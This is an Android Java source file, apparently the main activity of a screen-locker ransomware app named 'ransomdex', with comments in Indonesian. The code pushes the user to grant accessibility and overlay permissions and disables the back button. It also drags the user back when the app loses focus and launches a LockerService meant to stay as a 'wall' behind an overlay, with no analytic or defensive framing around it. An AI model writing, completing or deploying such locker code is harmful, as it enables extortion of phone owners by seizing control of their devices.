package com.bondex.ransomdex;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;
import android.text.TextUtils;

public class MainActivity extends Activity {

    private static final int ACTION_MANAGE_OVERLAY_PERMISSION_REQUEST_CODE = 5469;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Hilangkan animasi masuk agar tidak flicker
        overridePendingTransition(0, 0);

        // 1. Cek Accessibility dulu. Ini prioritas utama.
        if (!isAccessibilityEnabled()) {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivity(intent);
            return;
        }

        // 2. Jika Accessibility sudah aktif, minta izin Overlay
        checkPermission();
    }

    @Override
    public void onWindowFocusChanged(boolean hasFocus) {
        super.onWindowFocusChanged(hasFocus);
        // Tarik kembali jika Accessibility dan Overlay sudah aktif
        if (!hasFocus && isAccessibilityEnabled() && Settings.canDrawOverlays(this)) {
            startLocker();
        }
    }

    @Override
    public void onBackPressed() {
        // Blokir tombol back total
        return;
    }

    public void checkPermission() {
        if (!Settings.canDrawOverlays(this)) {
            // Jika izin belum diberikan, buka pengaturan sistem
            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + getPackageName()));
            startActivityForResult(intent, ACTION_MANAGE_OVERLAY_PERMISSION_REQUEST_CODE);
        } else {
            // Jika sudah ada izin, jalankan LockerService
            startLocker();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        
        if (requestCode == ACTION_MANAGE_OVERLAY_PERMISSION_REQUEST_CODE) {
            // Setelah kembali dari Overlay, baru nyalakan loker
            if (Settings.canDrawOverlays(this)) {
                startLocker();
            }
        }
    }

    private boolean isAccessibilityEnabled() {
        int accessibilityEnabled = 0;
        final String service = getPackageName() + "/" + getPackageName() + ".CustomAccessibilityService";
        try {
            accessibilityEnabled = Settings.Secure.getInt(
                    this.getContentResolver(),
                    android.provider.Settings.Secure.ACCESSIBILITY_ENABLED);
        } catch (Settings.SettingNotFoundException e) {}

        TextUtils.SimpleStringSplitter mStringColonSplitter = new TextUtils.SimpleStringSplitter(':');
        if (accessibilityEnabled == 1) {
            String settingValue = Settings.Secure.getString(this.getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (settingValue != null) {
                mStringColonSplitter.setString(settingValue);
                while (mStringColonSplitter.hasNext()) {
                    if (mStringColonSplitter.next().equalsIgnoreCase(service)) return true;
                }
            }
        }
        return false;
    }

    private void startLocker() {
        if (LockerService.isAuthenticated) {
            return;
        }
        // Memulai service pengunci layar
        Intent intent = new Intent(MainActivity.this, LockerService.class);
        startService(intent);
        
        // Jangan panggil finish()! Biarkan dia jadi tembok di belakang overlay
        overridePendingTransition(0, 0);
    }
}